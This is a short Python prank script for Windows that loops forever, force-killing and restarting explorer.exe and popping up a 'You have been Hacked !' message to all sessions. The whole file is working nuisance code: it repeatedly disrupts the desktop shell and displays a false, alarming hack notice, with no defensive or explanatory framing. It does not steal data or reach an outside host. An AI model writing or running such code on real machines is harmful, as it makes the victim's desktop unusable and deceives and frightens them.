import os,time

while True :

    os.system('TASKKILL /F /IM explorer.exe')
    time.sleep(4)
    os.system('start explorer.exe')
    os.system("msg * \"You have been Hacked !\"")
    time.sleep(2)